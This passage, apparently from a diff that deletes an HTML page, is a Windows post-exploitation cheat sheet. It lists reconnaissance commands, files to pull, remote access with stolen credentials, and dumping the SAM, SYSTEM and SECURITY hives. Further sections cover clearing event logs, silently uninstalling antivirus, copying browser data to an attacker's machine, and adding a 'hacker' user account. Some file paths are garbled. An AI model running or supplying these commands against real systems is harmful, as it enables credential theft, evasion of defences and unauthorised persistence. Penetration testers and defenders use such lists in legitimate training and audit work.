-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net share</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Displays your currently shared SMB entries, and what path(s) they point to.</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net session | find / “\”</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">arp -a</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Lists all the systems currently in the machine’s ARP table. </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">route print</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Prints the machine’s routing table. This can be good for finding other networks and static routes that have been put in place</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">browstat (Not working on XP)</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-</tbody></table>
-
-<h2 id="configs"><a href="#TOC">Configs</a></h2>
-<table style="border-collapse: collapse; border: medium none;">
-<colgroup></colgroup>
-<tbody>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;">Command</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;">Expected Output or Description</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">gpresult /z</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Extremely verbose output of GPO (Group policy) settings as applied to the current system and user</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">sc qc</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">sc query</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">sc queryex</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">type %WINDIR%32</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Print the contents of the Windows hosts file</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">dir %PROGRAMFILES%</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Prints a diretory listing of the Program Files directory.</span>
-</td></tr>
-<tr style="height: 49px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">echo %COMSPEC%</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Usually going to be cmd.exe in the Windows directory, but it’s good to know for sure.</span>
-</td></tr>
-</tbody></table>
-
-<h2 id="finding-important-files"><a href="#TOC">FINDING IMPORTANT FILES</a></h2>
-<table style="border-collapse: collapse; border: medium none; width: 624px;">
-<colgroup><col width="*"></col><col width="*"></col></colgroup>
-<tbody>
-<tr style="height: 32px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Command</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Description / Reason</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">tree C: /f /a &gt; C:_of_tree.txt</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Prints a directory listing in ‘tree’ format. The /a makes the tree printed with ASCII characters instead of special ones and the /f displays file names as well as folders</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">dir /a</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">dir /b /s [Directory or Filename]</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">dir  /s /b | find /I “searchstring”</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Searches the output of dir from the root of the drive current drive () and all sub drectories (/s) using the ‘base’ format (/b) so that it outputs the full path for each listing, for ‘searchstring’ anywhere in the file name or path.</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">command | find /c /v “”</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Counts the lines of whatever you use for ‘command’</span>
-</td></tr>
-</tbody></table>
-
-
-<h2 id="files-to-pull-if-possible"><a href="#TOC">FILES TO PULL (IF POSSIBLE)</a></h2>
-<table style="border-collapse: collapse; border: medium none; width: 624px;">
-<colgroup><col width="*"></col><col width="*"></col></colgroup>
-<tbody>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;">File location</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;">Description / Reason</span>
-</td></tr>
-<tr style="height: 68px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%SYSTEMDRIVE%.sys</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Large file, but contains spill over from RAM, usually lots of good information can be pulled, but should be a last resort due to size</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%.log</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%6.log (5, 6 or 7)</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%321.log</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%323svc1.log (year month day)</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%32.Evt</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%32.Evt</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%32.sav</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%32.sav</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%32.sav</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%32.sav</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%32*.log</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%USERPROFILE%.dat</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%USERPROFILE%<sub>1</sub>1.IE5.dat</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%WINDIR%32</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-</tbody></table>
-
-<h2 id="remote-system-access"><a href="#TOC">REMOTE SYSTEM ACCESS</a></h2>
-<table style="border-collapse: collapse; border: medium none; width: 624px;">
-<colgroup><col width="*"></col><col width="*"></col></colgroup>
-<tbody>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Command</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Description / Reason</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net share \computername</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">tasklist /V /S computername</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">qwinsta /SERVER:computername</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">qprocess /SERVER:computername *</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="font-size: small;"><br /> </span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net use \computername</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">This maps IPC$ which does not show up as a drive but allows you to access the remote system as the current user. This is less helpful as most commands will automatically make this connection if needed</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net use \computername /user:DOMAINpassword</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Using the IPC$ mount use a user name and password allows you to access commands that do not usually ask for a username and password as a different user in the context of the remote system.</span><br /> <span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">This is useful when you’ve gotten credentials from somewhere and wish to use them but do not have an active token on a machine you have a session on.</span>
-</td></tr>
-</tbody></table>
-
-<ul>
-<li>net time \computername (Shows the time of target computer)</li>
-<li>dir \computername_or_admin_share  (dir list a remote directory)</li>
-<li>tasklist /V /S computername
-<ul>
-<li>Lists tasks w/users running those tasks on a remote system. This will remove any IPC$ connection after it is done so if you are using another user, you need to re-initiate the IPC$ mount</li>
-</ul></li>
-</ul>
-<h2 id="auto-start-directories"><a href="#TOC">AUTO-START DIRECTORIES</a></h2>
-<table style="border-collapse: collapse; border: medium none;">
-<colgroup><col width="196"></col><col width="476"></col></colgroup>
-<tbody>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Windows NT 6.1, 6.0</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%SystemDrive%Menu&lt;/span&gt;
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Windows NT 5.2, 5.1, 5,0</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%SystemDrive%And SettingsUsersMenu&lt;/span&gt;
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Windows 9x</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%SystemDrive%Menu&lt;/span&gt;
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">Windows NT 4.0, 3.51, 3.50</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%SystemDrive%UsersMenu&lt;/span&gt;
-</td></tr>
-</tbody></table>
-
-<h2 id="wmi"><a href="#TOC">WMI</a></h2>
-<ul>
-<li>wmic bios</li>
-<li>wmic qfe</li>
-<li>wmic qfe get hotfixid (This gets patches IDs)</li>
-<li>wmic startup</li>
-<li>wmic service</li>
-<li>wmic os</li>
-<li>wmic process get caption,executablepath,commandline</li>
-<li>wmic process call create “process_name” (executes a program)</li>
-<li>wmic process where name=”process_name” call terminate (terminates program)</li>
-<li>wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber (hard drive information)</li>
-<li>wmic useraccount (usernames, sid, and various security related goodies)</li>
-<li>wmic useraccount get /ALL</li>
-<li>wmic share get /ALL (you can use ? for gets help ! )</li>
-<li>wmic startup list full (this can be a huge list!!!)</li>
-<li>wmic /node:“hostname” bios get serialnumber (this can be great for finding warranty info about target)</li>
-</ul>
-<h2 id="reg-command"><a href="#TOC">REG COMMAND</a></h2>
-<ul>
-<li>reg save HKLMsecurity.hive (Save security hive to a file)</li>
-<li>reg save HKLMsystem.hive (Save system hive to a file)</li>
-<li>reg save HKLMsam.hive (Save sam to a file)=</li>
-<li>reg add [\TargetIPaddr] [RegDomain][ ]</li>
-<li>reg export [RegDomain][Key] [FileName]</li>
-<li>reg import [FileName ]</li>
-<li>reg query [\TargetIPaddr] [RegDomain][ Key ] /v [Valuename!] (you can to add /s for recurse all values )</li>
-</ul>
-<h2 id="deleting-logs"><a href="#TOC">DELETING LOGS</a></h2>
-<ul>
-<li>wevtutil el (list logs)</li>
-<li>wevtutil cl <LogName> (Clear specific log)</li>
-<li>del %WINDIR%*.log /a /s /q /f</li>
-</ul>
-<h2 id="uninstalling-software-antivirus-non-interactive"><a href="#TOC">UNINSTALLING SOFTWARE “ANTIVIRUS” (NON INTERACTIVE)</a></h2>
-<ul>
-<li>wmic product get name /value (this gets software names)</li>
-<li>wmic product where name=“XXX” call uninstall /nointeractive (this uninstalls software)</li>
-</ul>
-<h2 id="other-to-be-sorted"><a href="#TOC">OTHER (TO BE SORTED)</a></h2>
-<ul>
-<li>pkgmgr usefull /iu :”Package”</li>
-<li>pkgmgr usefull /iu :”TelnetServer” (Install Telnet Service …)</li>
-<li>pkgmgr /iu:”TelnetClient” (Client )</li>
-<li>rundll32.exe user32.dll, LockWorkStation (locks the screen -invasive-)</li>
-<li>wscript.exe &lt;script js/vbs&gt;</li>
-<li>cscript.exe &lt;script js/vbs/c#&gt;</li>
-<li>xcopy /C /S %appdata%*.sqlite \your_box_funstuff</li>
-</ul>
-<h2 id="os-specific"><a href="#TOC">OS SPECIFIC</a></h2>
-<ul>
-<li>Win2k3
-<ul>
-<li>winpop stat domainname</li>
-</ul></li>
-<li>Vista/7
-<ul>
-<li>winstat features</li>
-<li>wbadmin get status</li>
-<li>wbadmin get items</li>
-<li>gpresult /H gpols.htm</li>
-<li>bcdedit /export &lt;filename&gt;</li>
-</ul></li>
-</ul>
-<h2 id="invasive-or-altering-commands"><a href="#TOC">INVASIVE OR ALTERING COMMANDS</a></h2>
-<table style="border-collapse: collapse; border: medium none; font-family: &quot;Trebuchet MS&quot;,sans-serif;">
-<colgroup><col width="336"></col><col width="320"></col></colgroup>
-<tbody>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;">Command</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;">Description</span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">net user hacker hacker /add</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
